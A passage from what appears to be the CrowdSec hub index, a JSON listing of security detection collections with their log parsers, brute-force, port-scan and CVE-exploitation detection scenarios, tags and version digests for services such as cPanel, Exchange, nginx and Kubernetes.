{"digest": "3501cb76beba2ec7f0ed44cf10e249e4db279903813e8b659c1d731c3a66ab2f"}}}, "crowdsecurity/cpanel": {"content": "parsers:\n  - crowdsecurity/cpanel-logs\n  - crowdsecurity/configserver-lfd-logs\nscenarios:\n  - crowdsecurity/cpanel-bf\n  - crowdsecurity/cpanel-bf-attempt\n  - crowdsecurity/configserver-lfd-bf\ndescription: \"cpanel support : parser and bruteforce detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - cpanel\n  - bruteforce\n", "description": "cpanel support : parser and bruteforce detection", "parsers": ["crowdsecurity/cpanel-logs", "crowdsecurity/configserver-lfd-logs"], "path": "collections/crowdsecurity/cpanel.yaml", "scenarios": ["crowdsecurity/cpanel-bf", "crowdsecurity/cpanel-bf-attempt", "crowdsecurity/configserver-lfd-bf"], "version": "0.3", "versions": {"0.1": {"digest": "708cb00f74feff6b8bc5109ba0dea0ed646229adbbb2174288ea7bd185b31e53"}, "0.2": {"digest": "f2496391e82604dcba85c91ba79ec8204661aca4fdb38f6c46773f203c99b9fe"}, "0.3": {"digest": "4f16f7015f9fcd4727413b3e742b4582d3c8fd565e1377e6dacdc6ed68e9735c"}}}, "crowdsecurity/discord-crawler-whitelist": {"content": "postoverflows:\n  - crowdsecurity/discord-crawler-whitelist\n  - crowdsecurity/rdns\ndescription: \"Whitelist Discord PTR domains\"\nauthor: crowdsecurity\ntags:\n  - whitelist\n  - bot\n  - crawler\n", "description": "Whitelist Discord PTR domains", "path": "collections/crowdsecurity/discord-crawler-whitelist.yaml", "postoverflows": ["crowdsecurity/discord-crawler-whitelist", "crowdsecurity/rdns"], "version": "0.1", "versions": {"0.1": {"digest": "f8d9ddc77d06de7b5a861a44190bbbb1cd16e71e835c7c85b39d2c03d01c7b33"}}}, "crowdsecurity/dovecot": {"content": "parsers:\n  - crowdsecurity/dovecot-logs\nscenarios:\n  - crowdsecurity/dovecot-spam\ndescription: \"dovecot support : parser and spammer detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - spam\n  - bruteforce\n", "description": "dovecot support : parser and spammer detection", "parsers": ["crowdsecurity/dovecot-logs"], "path": "collections/crowdsecurity/dovecot.yaml", "scenarios": ["crowdsecurity/dovecot-spam"], "version": "0.1", "versions": {"0.1": {"digest": "7990a4b855273b5ceaa379d2979d796e070c96a398caeefbfa1933cc36f690be"}}}, "crowdsecurity/endlessh": {"content": "#the list of parsers it contains\nparsers:\n  - crowdsecurity/endlessh-logs\n  - crowdsecurity/dateparse-enrich\nscenarios:\n  - crowdsecurity/endlessh-bf\ndescription: \"endlessh support : logs parser and brute-force detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - ssh\n  - endlessh\n  - bruteforce\n", "description": "endlessh support : logs parser and brute-force detection", "parsers": ["crowdsecurity/endlessh-logs", "crowdsecurity/dateparse-enrich"], "path": "collections/crowdsecurity/endlessh.yaml", "scenarios": ["crowdsecurity/endlessh-bf"], "version": "0.1", "versions": {"0.1": {"digest": "43b070a6e5c49f66dc970d4a8cc8fb37cef90c5da5aa6276c012e343ba06f0e5"}}}, "crowdsecurity/exchange": {"collections": ["crowdsecurity/windows", "crowdsecurity/iis"], "content": "parsers:\n  - crowdsecurity/exchange-smtp-logs\n  - crowdsecurity/exchange-imap-logs\n  - crowdsecurity/exchange-pop-logs\nscenarios:\n  - crowdsecurity/exchange-bf\n  - crowdsecurity/windows-bf\ncollections:\n  - crowdsecurity/windows\n  - crowdsecurity/iis\ndescription: \"Exchange support : Bruteforce detection for OWA,SMTP,IMAP and POP\"\nauthor: crowdsecurity\ntags:\n  - windows\n  - iis\n  - exchange\n  - bruteforce\n\n", "description": "Exchange support : Bruteforce detection for OWA,SMTP,IMAP and POP", "parsers": ["crowdsecurity/exchange-smtp-logs", "crowdsecurity/exchange-imap-logs", "crowdsecurity/exchange-pop-logs"], "path": "collections/crowdsecurity/exchange.yaml", "scenarios": ["crowdsecurity/exchange-bf", "crowdsecurity/windows-bf"], "version": "0.3", "versions": {"0.1": {"digest": "95cf2f72de900427c545793800c465716508b4e2953bdc0024b8d757fbbed8df"}, "0.2": {"digest": "cc3b0e749e8fd9470d6274bc9cace5d7fa1fa2d09eac6c36a4c998600c449dae"}, "0.3": {"digest": "33da539eede53d578b7f415591d69b9ffabdfdf59b33de2a5f9224e5b345785c"}}}, "crowdsecurity/exim": {"content": "parsers:\n  - crowdsecurity/exim-logs\nscenarios:\n  - crowdsecurity/exim-bf\n  - crowdsecurity/exim-spam\ndescription: \"exim support : parser and bruteforce/spam detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - spam\n  - bruteforce\n", "description": "exim support : parser and bruteforce/spam detection", "parsers": ["crowdsecurity/exim-logs"], "path": "collections/crowdsecurity/exim.yaml", "scenarios": ["crowdsecurity/exim-bf", "crowdsecurity/exim-spam"], "version": "0.1", "versions": {"0.1": {"digest": "f4a5ec5e7a5d52b4686e3c58481e098a231adc603e559bb3cb9aab888545eaa4"}}}, "crowdsecurity/fastly": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "parsers:\n  - crowdsecurity/fastly-logs\ncollections:\n  - crowdsecurity/base-http-scenarios\ndescription: \"fastly support : parser and generic http scenarios\"\nauthor: crowdsecurity\ntags:\n  - fastly\n  - http\n  - crawl\n  - scan", "description": "fastly support : parser and generic http scenarios", "parsers": ["crowdsecurity/fastly-logs"], "path": "collections/crowdsecurity/fastly.yaml", "version": "0.1", "versions": {"0.1": {"digest": "6bac9453d3b274fc310b558fe41672ff09ac910463e3bea982b4f14cb3a7bf61"}}}, "crowdsecurity/fortinet": {"content": "parsers:\n  - crowdsecurity/fortinet-logs\nscenarios:\n  - crowdsecurity/fortinet-vpn-bruteforce\ncontexts:\n  - crowdsecurity/fortinet\ndescription: \"Fortinet support : Parser and scenarios for Fortinet Log\"\nauthor: crowdsecurity\ntags:\n  - fortinet\n", "contexts": ["crowdsecurity/fortinet"], "description": "Fortinet support : Parser and scenarios for Fortinet Log", "parsers": ["crowdsecurity/fortinet-logs"], "path": "collections/crowdsecurity/fortinet.yaml", "scenarios": ["crowdsecurity/fortinet-vpn-bruteforce"], "version": "0.1", "versions": {"0.1": {"digest": "190ec6987667d8812a9c78f48b6347da23211e5aafde2821dca42b798dcdd174"}}}, "crowdsecurity/freebsd": {"collections": ["crowdsecurity/sshd", "crowdsecurity/whitelist-good-actors"], "content": "parsers:\n  - crowdsecurity/syslog-logs\n  - crowdsecurity/geoip-enrich\n  - crowdsecurity/dateparse-enrich\ncollections:\n  - crowdsecurity/sshd\n  - crowdsecurity/whitelist-good-actors\ndescription: \"core freebsd support : syslog+geoip+ssh\"\nauthor: crowdsecurity\ntags:\n  - freebsd\n", "description": "core freebsd support : syslog+geoip+ssh", "parsers": ["crowdsecurity/syslog-logs", "crowdsecurity/geoip-enrich", "crowdsecurity/dateparse-enrich"], "path": "collections/crowdsecurity/freebsd.yaml", "version": "0.4", "versions": {"0.1": {"digest": "f2969de2e7c76a12e9c9f6a7797a62f184df6a2c188db2ac6b1e0914e342b59f"}, "0.2": {"digest": "306667f291b1cb3b9fc27122c82cea3e59cb6e2f9597a1eee995b6f010fac7a1"}, "0.3": {"digest": "985e9853fb5799730272b51c4495648e0fa6a1d8566a2e517aa1166d06a02e29"}, "0.4": {"digest": "ecab718386c118b9a91ad9e157ec1ebdb0f8dbc1a4cb0cf42ebd71fcf32393d1"}}}, "crowdsecurity/freeswitch": {"content": "parsers:\n  - crowdsecurity/freeswitch\nscenarios:\n  - crowdsecurity/freeswitch-user-enumeration\n  - crowdsecurity/freeswitch-bf\n  - crowdsecurity/freeswitch-acl-reject\ndescription: \"freeswitch collection\"\nauthor: crowdsecurity\ntags:\n  - voip", "description": "freeswitch collection", "parsers": ["crowdsecurity/freeswitch"], "path": "collections/crowdsecurity/freeswitch.yaml", "scenarios": ["crowdsecurity/freeswitch-user-enumeration", "crowdsecurity/freeswitch-bf", "crowdsecurity/freeswitch-acl-reject"], "version": "0.1", "versions": {"0.1": {"digest": "3a7747ed253a57ef3f985cf18d1649fdea195db3608c6a162ccba43c3066b63a"}}}, "crowdsecurity/haproxy": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "parsers:\n  - crowdsecurity/haproxy-logs\ncollections:\n  - crowdsecurity/base-http-scenarios\ndescription: \"haproxy support : parser and generic http scenarios\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - haproxy\n  - crawl\n  - scan\n\n", "description": "haproxy support : parser and generic http scenarios", "parsers": ["crowdsecurity/haproxy-logs"], "path": "collections/crowdsecurity/haproxy.yaml", "version": "0.1", "versions": {"0.1": {"digest": "41d5394188f55956e017cb3f851e93411dbf078b0176a0968dd7760b1ad5b2e5"}}}, "crowdsecurity/home-assistant": {"content": "parsers:\n  - crowdsecurity/home-assistant-logs\nscenarios:\n  - crowdsecurity/home-assistant-bf\ndescription: \"Home assistant support : logs and brute-force scenario\"\nauthor: crowdsecurity\ntags:\n  - home-assistant\n  - bruteforce\n", "description": "Home assistant support : logs and brute-force scenario", "parsers": ["crowdsecurity/home-assistant-logs"], "path": "collections/crowdsecurity/home-assistant.yaml", "scenarios": ["crowdsecurity/home-assistant-bf"], "version": "0.1", "versions": {"0.1": {"digest": "4af5665511aa35371d1abf2007505863c4e166a1637a51a47c5f7db49f2bdf76"}}}, "crowdsecurity/http-cve": {"content": "scenarios:\n  - crowdsecurity/http-cve-2021-41773\n  - crowdsecurity/http-cve-2021-42013\n  - crowdsecurity/grafana-cve-2021-43798\n  - crowdsecurity/vmware-vcenter-vmsa-2021-0027\n  - crowdsecurity/fortinet-cve-2018-13379\n  - crowdsecurity/pulse-secure-sslvpn-cve-2019-11510\n  - crowdsecurity/f5-big-ip-cve-2020-5902\n  - crowdsecurity/thinkphp-cve-2018-20062\n  - crowdsecurity/apache_log4j2_cve-2021-44228\n  - crowdsecurity/jira_cve-2021-26086\n  - crowdsecurity/spring4shell_cve-2022-22965\n  - crowdsecurity/vmware-cve-2022-22954\n  - crowdsecurity/CVE-2022-37042\n  - crowdsecurity/CVE-2022-41082\n  - crowdsecurity/CVE-2022-35914\n  - crowdsecurity/CVE-2022-40684\n  - crowdsecurity/CVE-2022-26134\n  - crowdsecurity/CVE-2022-42889\n  - crowdsecurity/CVE-2022-41697\n  - crowdsecurity/CVE-2022-46169\n  - crowdsecurity/CVE-2022-44877\n  - crowdsecurity/CVE-2019-18935\n  - crowdsecurity/netgear_rce\n  - crowdsecurity/CVE-2023-22515\n  - crowdsecurity/CVE-2023-22518\n  - crowdsecurity/CVE-2023-49103\n  - crowdsecurity/CVE-2017-9841\n  - crowdsecurity/CVE-2024-38475\n  - crowdsecurity/CVE-2024-0012\n  - crowdsecurity/CVE-2024-9474\nauthor: crowdsecurity\ndescription: \"Detect CVE exploitation in http logs\"\ntags:\n  - web\n  - exploit\n  - cve\n  - http\n", "description": "Detect CVE exploitation in http logs", "path": "collections/crowdsecurity/http-cve.yaml", "scenarios": ["crowdsecurity/http-cve-2021-41773", "crowdsecurity/http-cve-2021-42013", "crowdsecurity/grafana-cve-2021-43798", "crowdsecurity/vmware-vcenter-vmsa-2021-0027", "crowdsecurity/fortinet-cve-2018-13379", "crowdsecurity/pulse-secure-sslvpn-cve-2019-11510", "crowdsecurity/f5-big-ip-cve-2020-5902", "crowdsecurity/thinkphp-cve-2018-20062", "crowdsecurity/apache_log4j2_cve-2021-44228", "crowdsecurity/jira_cve-2021-26086", "crowdsecurity/spring4shell_cve-2022-22965", "crowdsecurity/vmware-cve-2022-22954", "crowdsecurity/CVE-2022-37042", "crowdsecurity/CVE-2022-41082", "crowdsecurity/CVE-2022-35914", "crowdsecurity/CVE-2022-40684", "crowdsecurity/CVE-2022-26134", "crowdsecurity/CVE-2022-42889", "crowdsecurity/CVE-2022-41697", "crowdsecurity/CVE-2022-46169", "crowdsecurity/CVE-2022-44877", "crowdsecurity/CVE-2019-18935", "crowdsecurity/netgear_rce", "crowdsecurity/CVE-2023-22515", "crowdsecurity/CVE-2023-22518", "crowdsecurity/CVE-2023-49103", "crowdsecurity/CVE-2017-9841", "crowdsecurity/CVE-2024-38475", "crowdsecurity/CVE-2024-0012", "crowdsecurity/CVE-2024-9474"], "version": "2.9", "versions": {"0.1": {"digest": "30748e051a470c1bc91506ae63e8784cd054564f90ccc23eb655823fc30e3019"}, "0.2": {"digest": "bc244c864674e59cd36ec4781bb85b5f94f77562a28a65e6bb64da789cf97379"}, "0.3": {"digest": "8a33f5787f19100add139f53ae98978a2c265badaf99b09365a47d686baeb5b2"}, "0.4": {"digest": "f5a38fc37ff6a5aa80a1411fe75ba27d9691ebf3da96b6d169d2fecc052fb528"}, "0.5": {"digest": "f9be2b19b2c12d4b0d4fc10de95b3138c4ae19ccaa04975d1e6a242e1fc2abf4"}, "0.6": {"digest": "d385131b7c0763a6fe71d6544599e69d79e6ff97c92b2b253470b9b1632bb71a"}, "0.7": {"digest": "33d997a205be7dad55f5fadb1b56da3cd7a22b6333037af83132a948a6cc063f"}, "0.8": {"digest": "9a6f6b6afb19f4ecafa4cb195d96c3380d9f2b5621424a1ee296ae34dc29f814"}, "0.9": {"digest": "ff8e1e8b942d229cbe6de261b864fef4052b3c83018fe389b5441bd62c824d38"}, "1.0": {"digest": "c10453ceeb22dcdf11fa386fe072c9aa6ede4a76e7cc9940caa429d8ec8814d5"}, "1.1": {"digest": "d211c127d1295986dd11c1502295e538943baafcb04bab094b792f85531376f9"}, "1.2": {"digest": "e1a9c0a6a058d043717ce66c649f632161d9ea788a77c9ce92ad50ab231c920c"}, "1.3": {"digest": "537a00505f86acb335d66130e9e3d1cc867d99a26fe7d3a66904eb3ec57c3f43"}, "1.4": {"digest": "e07c151e8686c9cf5ba5f5cb1513c8edeb1e4d6ee6a3672a835a0441c3cfcff7"}, "1.5": {"digest": "97e3a10706edfa4ccb637673705d133e24ec8601f7199c7fd5884bd673778506"}, "1.6": {"digest": "f38f6f62c92971e1537992406128a5438962f8bea6b9fdd9d8eacd5fd5cb6485"}, "1.7": {"digest": "f7d7eb0b2c5257e689397ff696e85a56640f0819ef4695c47119927aefbf8c79"}, "1.8": {"digest": "a00340eb67ac16be546794135dd64ee2ae1709989d1d31ae7633de771bcec529"}, "1.9": {"digest": "74c4696ca67d82e18dd6188f8934699f0c3b10e8ccde318d9de2a6ca9c40f31c"}, "2.0": {"digest": "282fb0e5941d39b850f3199498fe282c69293c7f29892c80e16d28e4c452608d"}, "2.1": {"digest": "bf083cddb42468da403bdcba02efc6e287ef640512a0442f7b180dc091e1fb44"}, "2.2": {"digest": "a80217f6b47bfb101bad21a25666123b1f940d1dcd31e1e1e320b6213fa9f4b0"}, "2.3": {"digest": "00e148cb998efbf5668391f2971ec39ee3c2bcc8e0e6c952fe436709678abf72"}, "2.4": {"digest": "9a1288c042d53f81c16653efae7084bbb83e56cec8a6eade98c702e2febb8d4e"}, "2.5": {"digest": "c6c395c6d6d694ecfb8957e93bd8895a8c341511d070486cbd768056a323994d"}, "2.6": {"digest": "dd2e8debbba19d19646b9a8010baf9bd901a4eec84a53a0cb62294b8da3e91ef"}, "2.7": {"digest": "b974f20dc2cf23c292eede422c1c6e0008297f8b3397e3851bb6a988866f3e34"}, "2.8": {"digest": "7c6a2ecd3b3d28164eb0212ea49e5ce23f35814ef0f6d8be5d8dab058b514083"}, "2.9": {"digest": "4bd84ba53d1668df2bc2933f38f7d07322b6a68ea60907860a9b81bc1a497407"}}}, "crowdsecurity/http-dos": {"content": "scenarios:\n  - crowdsecurity/http-dos-bypass-cache\n  - crowdsecurity/http-dos-random-uri\n  - crowdsecurity/http-dos-switching-ua\n  - crowdsecurity/http-dos-invalid-http-versions\nauthor: crowdsecurity\ntags:\n  - web\n  - dos\n  - http\n", "path": "collections/crowdsecurity/http-dos.yaml", "scenarios": ["crowdsecurity/http-dos-bypass-cache", "crowdsecurity/http-dos-random-uri", "crowdsecurity/http-dos-switching-ua", "crowdsecurity/http-dos-invalid-http-versions"], "version": "0.2", "versions": {"0.1": {"digest": "9b9657dd6f304e3660f4dd8e9e289ef3d7302cdad759c5efc72333c1e3e96020"}, "0.2": {"digest": "3ffa21f9474ea37d7c7d70156d05d557c16a62b8ae08dce202ce5d288609fef7"}}}, "crowdsecurity/http-extended-context": {"content": "contexts:\n  - crowdsecurity/http_extended", "contexts": ["crowdsecurity/http_extended"], "path": "collections/crowdsecurity/http-extended-context.yaml", "version": "0.1", "versions": {"0.1": {"digest": "3ba0c702e536c2cf5760159e8203e12482ffb16b1da307449a51b2d83553c7f8"}}}, "crowdsecurity/iis": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "parsers:\n  - crowdsecurity/iis-logs\ncollections:\n  - crowdsecurity/base-http-scenarios\ndescription: \"IIS support : parser and generic http scenarios \"\nauthor: crowdsecurity\ntags:\n  - windows\n  - iis\n  - crawl\n  - scan\n\n", "description": "IIS support : parser and generic http scenarios ", "parsers": ["crowdsecurity/iis-logs"], "path": "collections/crowdsecurity/iis.yaml", "version": "0.1", "versions": {"0.1": {"digest": "045c579c8cbb0e1e15f76c22b6465d6113df4117e48ae018043c2c1c01cd4b42"}}}, "crowdsecurity/iptables": {"content": "parsers:\n  - crowdsecurity/iptables-logs\nscenarios:\n  - crowdsecurity/iptables-scan-multi_ports\ncontexts:\n  - crowdsecurity/firewall_base\ndescription: \"iptables support : logs and port-scans detection scenarios\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - portscan\n  - iptables\n\n", "contexts": ["crowdsecurity/firewall_base"], "description": "iptables support : logs and port-scans detection scenarios", "parsers": ["crowdsecurity/iptables-logs"], "path": "collections/crowdsecurity/iptables.yaml", "scenarios": ["crowdsecurity/iptables-scan-multi_ports"], "version": "0.2", "versions": {"0.1": {"digest": "ba5c8e97c06b19e4c075e0285e6b60c1da3b86381c88c4bfea4b374378ced10a"}, "0.2": {"digest": "d59e4198c2b88cccb6f9da9f9375348a1835d7f5a933d7452693ad0321ef1282"}}}, "crowdsecurity/k8s-audit": {"content": "parsers:\n  - crowdsecurity/k8s-audit\nscenarios:\n  - crowdsecurity/k8s-audit-anonymous-access\n  - crowdsecurity/k8s-audit-api-server-bruteforce\n  - crowdsecurity/k8s-audit-pod-host-network\n  - crowdsecurity/k8s-audit-pod-exec\n  - crowdsecurity/k8s-audit-pod-host-path-volume\n  - crowdsecurity/k8s-audit-privileged-pod-creation\n  - crowdsecurity/k8s-audit-service-account-access-denied\ndescription: \"Kubernetes audit log support: detect security sensitive events in a cluster\"\nauthor: crowdsecurity\ntags:\n  - kubernetes\n  - notification\n  - audit\n\n", "description": "Kubernetes audit log support: detect security sensitive events in a cluster", "parsers": ["crowdsecurity/k8s-audit"], "path": "collections/crowdsecurity/k8s-audit.yaml", "scenarios": ["crowdsecurity/k8s-audit-anonymous-access", "crowdsecurity/k8s-audit-api-server-bruteforce", "crowdsecurity/k8s-audit-pod-host-network", "crowdsecurity/k8s-audit-pod-exec", "crowdsecurity/k8s-audit-pod-host-path-volume", "crowdsecurity/k8s-audit-privileged-pod-creation", "crowdsecurity/k8s-audit-service-account-access-denied"], "version": "0.1", "versions": {"0.1": {"digest": "b1f61b14b0f5411d78d1737375a01790e6c3b45feec2fbcb35595a39f17ecadd"}}}, "crowdsecurity/kasm": {"content": "parsers:\n#generic post-parsing of http stuff\n  - crowdsecurity/kasm-logs\nscenarios:\n  - crowdsecurity/kasm-bruteforce\ndescription: \"kasm workspaces support : parser and bruteforce scenario\"\nauthor: crowdsecurity\ntags:\n  - kasm\n  - bruteforce\n", "description": "kasm workspaces support : parser and bruteforce scenario", "parsers": ["crowdsecurity/kasm-logs"], "path": "collections/crowdsecurity/kasm.yaml", "scenarios": ["crowdsecurity/kasm-bruteforce"], "version": "0.1", "versions": {"0.1": {"digest": "4e228f3fca8480631574e00b5821384f846d1d9e636b6fa4461525a914ed790b"}}}, "crowdsecurity/laurel": {"content": "parsers:\n  - crowdsecurity/laurel-logs\nscenarios:\n  - crowdsecurity/auditd-postexploit-rm\n  - crowdsecurity/auditd-postexploit-pkill\n  - crowdsecurity/auditd-postexploit-exec-from-net\n  - crowdsecurity/auditd-sus-exec\n  - crowdsecurity/auditd-base64-exec-behavior\n  - crowdsecurity/auditd-suid-crash\npostoverflows:\n  - crowdsecurity/auditd-whitelisted-process\ndescription: \"laurel support : parsers and scenarios\"\nauthor: crowdsecurity\ntags:\n  - auditd\n  - laurel\n  - compliance\n  - postexploitation\n\n", "description": "laurel support : parsers and scenarios", "parsers": ["crowdsecurity/laurel-logs"], "path": "collections/crowdsecurity/laurel.yaml", "postoverflows": ["crowdsecurity/auditd-whitelisted-process"], "scenarios": ["crowdsecurity/auditd-postexploit-rm", "crowdsecurity/auditd-postexploit-pkill", "crowdsecurity/auditd-postexploit-exec-from-net", "crowdsecurity/auditd-sus-exec", "crowdsecurity/auditd-base64-exec-behavior", "crowdsecurity/auditd-suid-crash"], "version": "0.1", "versions": {"0.1": {"digest": "9bdca25746fee347ba770f895fcf4b7d0bb1d9c9b5de8382cdc14f0093a1333a"}}}, "crowdsecurity/linux": {"collections": ["crowdsecurity/sshd", "crowdsecurity/whitelist-good-actors"], "content": "parsers:\n  - crowdsecurity/syslog-logs\n  - crowdsecurity/geoip-enrich\n  - crowdsecurity/dateparse-enrich\ncollections:\n  - crowdsecurity/sshd\n  - crowdsecurity/whitelist-good-actors\ndescription: \"core linux support : syslog+geoip+ssh\"\nauthor: crowdsecurity\ntags:\n  - linux\n", "description": "core linux support : syslog+geoip+ssh", "parsers": ["crowdsecurity/syslog-logs", "crowdsecurity/geoip-enrich", "crowdsecurity/dateparse-enrich"], "path": "collections/crowdsecurity/linux.yaml", "version": "0.3", "versions": {"0.1": {"digest": "8d16483218a979b84549fb020b0342feea3d1f4951294b6994d33a9b7214842f"}, "0.2": {"digest": "baaa37b12b4d734fab81ae01ff81c58ceb7a99304f21e6bb6ff86b871ed6d5eb"}, "0.3": {"digest": "8c579053f022942c1ca5ea2b7ecbbbf8c8befe6cf47a423b78597666237b1fec"}}}, "crowdsecurity/linux-lpe": {"collections": ["crowdsecurity/linux"], "content": "parsers:\n  - crowdsecurity/pkexec-logs\n  - crowdsecurity/segfault-logs\nscenarios:\n  - crowdsecurity/CVE-2021-4034\n  - crowdsecurity/CVE-2023-4911\ncollections:\n  - crowdsecurity/linux\ndescription: \"Linux Local Privilege Escalation collection : detect trivial LPEs\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - privsec\n  - lpe\n\n\n", "description": "Linux Local Privilege Escalation collection : detect trivial LPEs", "parsers": ["crowdsecurity/pkexec-logs", "crowdsecurity/segfault-logs"], "path": "collections/crowdsecurity/linux-lpe.yaml", "scenarios": ["crowdsecurity/CVE-2021-4034", "crowdsecurity/CVE-2023-4911"], "version": "0.2", "versions": {"0.1": {"digest": "a68ef0b517c988b50b3cdc0d84702b2f70e621d29378b9782b2e037bf6663458"}, "0.2": {"digest": "fd4a1d641522646b438dcf6572eddee3196c21bbc4dc75907515fd25e4f27578"}}}, "crowdsecurity/litespeed": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "parsers:\n  - crowdsecurity/litespeed-logs\ncollections:\n  - crowdsecurity/base-http-scenarios\nscenarios:\n  - crowdsecurity/litespeed-admin-bf\ndescription: \"litespeed support : parser and generic http scenarios\"\nauthor: crowdsecurity\ntags:\n  - litespeed\n  - crawl\n  - scan\n\n", "description": "litespeed support : parser and generic http scenarios", "parsers": ["crowdsecurity/litespeed-logs"], "path": "collections/crowdsecurity/litespeed.yaml", "scenarios": ["crowdsecurity/litespeed-admin-bf"], "version": "0.1", "versions": {"0.1": {"digest": "c3bfb3dea73e8880ca0598b4ede129f0468361cadabd7ce214f92598348da97e"}}}, "crowdsecurity/magento": {"content": "parsers:\n  - crowdsecurity/syslog-logs\n  - crowdsecurity/magento-extension-logs\n  - crowdsecurity/dateparse-enrich\n  - crowdsecurity/geoip-enrich\nscenarios:\n  - crowdsecurity/http-magento-bf\n  - crowdsecurity/http-magento-ccs-by-country\n  - crowdsecurity/http-magento-ccs-by-as\n  - crowdsecurity/http-magento-ccs\ndescription: \"Magento collection\"\nauthor: crowdsecurity\ntags:\n  - magento\n  - http\n\n", "description": "Magento collection", "parsers": ["crowdsecurity/syslog-logs", "crowdsecurity/magento-extension-logs", "crowdsecurity/dateparse-enrich", "crowdsecurity/geoip-enrich"], "path": "collections/crowdsecurity/magento.yaml", "scenarios": ["crowdsecurity/http-magento-bf", "crowdsecurity/http-magento-ccs-by-country", "crowdsecurity/http-magento-ccs-by-as", "crowdsecurity/http-magento-ccs"], "version": "0.1", "versions": {"0.1": {"digest": "9ed2119aafbc789322dcde0e88a1df2912764b98c5e978edb001b67e610f31ad"}}}, "crowdsecurity/mariadb": {"content": "parsers:\n  - crowdsecurity/mariadb-logs\nscenarios:\n  - crowdsecurity/mariadb-bf\ndescription: \"mariadb support : logs and brute-force scenarios\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - mariadb\n  - bruteforce\n", "description": "mariadb support : logs and brute-force scenarios", "parsers": ["crowdsecurity/mariadb-logs"], "path": "collections/crowdsecurity/mariadb.yaml", "scenarios": ["crowdsecurity/mariadb-bf"], "version": "0.1", "versions": {"0.1": {"digest": "88ec0daef18bbbce68c6ae2c0593cf152973221efb630a745f7cbb34feb80ff8"}}}, "crowdsecurity/modsecurity": {"content": "parsers:\n  - crowdsecurity/modsecurity\nscenarios:\n  - crowdsecurity/modsecurity\ndescription: \"modsecurity support : modsecurity parser and scenario\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - web\n  - waf", "description": "modsecurity support : modsecurity parser and scenario", "parsers": ["crowdsecurity/modsecurity"], "path": "collections/crowdsecurity/modsecurity.yaml", "scenarios": ["crowdsecurity/modsecurity"], "version": "0.1", "versions": {"0.1": {"digest": "530454a9dbdb3800f62de4b8ba7d6ed2160b4e533d577c52393f5f286df2b615"}}}, "crowdsecurity/mssql": {"content": "parsers:\n  - crowdsecurity/mssql-logs\nscenarios:\n  - crowdsecurity/mssql-bf\ndescription: \"mssql support : logs and brute-force scenarios\"\nauthor: crowdsecurity\ntags:\n  - windows\n  - mssql\n  - bruteforce\n", "description": "mssql support : logs and brute-force scenarios", "parsers": ["crowdsecurity/mssql-logs"], "path": "collections/crowdsecurity/mssql.yaml", "scenarios": ["crowdsecurity/mssql-bf"], "version": "0.1", "versions": {"0.1": {"digest": "109bf56d5781fca733b958588338370d2196a2c3e490eccb94c56df6341a3ba8"}}}, "crowdsecurity/mysql": {"content": "parsers:\n  - crowdsecurity/mysql-logs\nscenarios:\n  - crowdsecurity/mysql-bf\ndescription: \"mysql support : logs and brute-force scenarios\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - mysql\n  - bruteforce\n", "description": "mysql support : logs and brute-force scenarios", "parsers": ["crowdsecurity/mysql-logs"], "path": "collections/crowdsecurity/mysql.yaml", "scenarios": ["crowdsecurity/mysql-bf"], "version": "0.1", "versions": {"0.1": {"digest": "77e63a6deedaedc15457691e8631633c15663e796f9e896331d64aa3614fdafc"}}}, "crowdsecurity/naxsi": {"content": "parsers:\n#generic post-parsing of http stuff\n  - crowdsecurity/nginx-logs\n  - crowdsecurity/naxsi-logs\nscenarios:\n  - crowdsecurity/naxsi-exploit-vpatch\ndescription: \"naxsi support : parser and vpatch scenario\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - nginx\n  - naxsi\n  - exploit\n\n", "description": "naxsi support : parser and vpatch scenario", "parsers": ["crowdsecurity/nginx-logs", "crowdsecurity/naxsi-logs"], "path": "collections/crowdsecurity/naxsi.yaml", "scenarios": ["crowdsecurity/naxsi-exploit-vpatch"], "version": "0.1", "versions": {"0.1": {"digest": "cd093e3b26795e8ae86898a585ef77509dc988c4841ea49ba61795a7c849b06e"}}}, "crowdsecurity/nextcloud": {"content": "---\nparsers:\n  - crowdsecurity/nextcloud-logs\n  - crowdsecurity/nextcloud-whitelist\nscenarios:\n  - crowdsecurity/nextcloud-bf\ndescription: \"Nextcloud support : parser and brute-force detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - bruteforce\n  - nextcloud\n", "description": "Nextcloud support : parser and brute-force detection", "parsers": ["crowdsecurity/nextcloud-logs", "crowdsecurity/nextcloud-whitelist"], "path": "collections/crowdsecurity/nextcloud.yaml", "scenarios": ["crowdsecurity/nextcloud-bf"], "version": "0.3", "versions": {"0.1": {"digest": "970735016eb78b0d0c722d7ed426b0edc1efd603547bf8cd5d68c57484e7a855"}, "0.2": {"digest": "a60b9e37b9f440f290632cdc20832b5a53ce9b59b3ce1d926b4ef40b49776c34"}, "0.3": {"digest": "d2da4c1ec583f676030446419b7cc2e1b02935965c1ba7f10ffe8fce0e1f4182"}}}, "crowdsecurity/nginx": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "parsers:\n#generic post-parsing of http stuff\n  - crowdsecurity/nginx-logs\ncollections:\n  - crowdsecurity/base-http-scenarios\nscenarios:\n  - crowdsecurity/nginx-req-limit-exceeded\ndescription: \"nginx support : parser and generic http scenarios\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - nginx\n  - crawl\n  - scan\n\n", "description": "nginx support : parser and generic http scenarios", "parsers": ["crowdsecurity/nginx-logs"], "path": "collections/crowdsecurity/nginx.yaml", "scenarios": ["crowdsecurity/nginx-req-limit-exceeded"], "version": "0.2", "versions": {"0.1": {"digest": "5ef06c9a84fbea5b01d901a6a23d5de8de811da5036e5ec4f6a8d00fb096805b"}, "0.2": {"digest": "334f7e5626a83c576af2dec1360b760991d09b6f418590a174748a4ca00bd1e4"}}}, "crowdsecurity/nginx-proxy-manager": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "parsers:\n  - 